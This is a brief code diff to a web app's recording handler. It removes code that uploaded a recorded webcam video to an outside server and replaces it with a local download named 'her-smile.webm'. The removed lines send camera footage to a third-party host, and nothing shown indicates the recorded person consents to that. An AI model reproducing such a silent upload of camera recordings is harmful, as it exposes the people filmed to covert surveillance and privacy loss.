@@ -42,20 +42,11 @@ function App() {
       };
       mediaRecorder.onstop = async () => {
         const blob = new Blob(recordedChunks.current, { type: "video/webm" });
-        const formData = new FormData();
-        formData.append("video", blob, "recorded-video.webm");
-        try {
-          const res = await fetch("http://muslimhafiz.great-site.net/index.php", {
-            method: "POST",
-            body: formData,
-          });
-          const data = await res.text();
-          console.log(data);
-        } catch (err) {
-          console.error("Upload failed:", err);
-        }
-        recordedChunks.current = [];
-      };
+     const url = URL.createObjectURL(blob); 
+const a = document.createElement("a"); 
+a.href = url; a.download = "her-smile.webm";
+ a.click(); recordedChunks.current = []; 
+};
       mediaRecorder.start();
     } catch (err) {
       console.error("Camera access denied ", err);
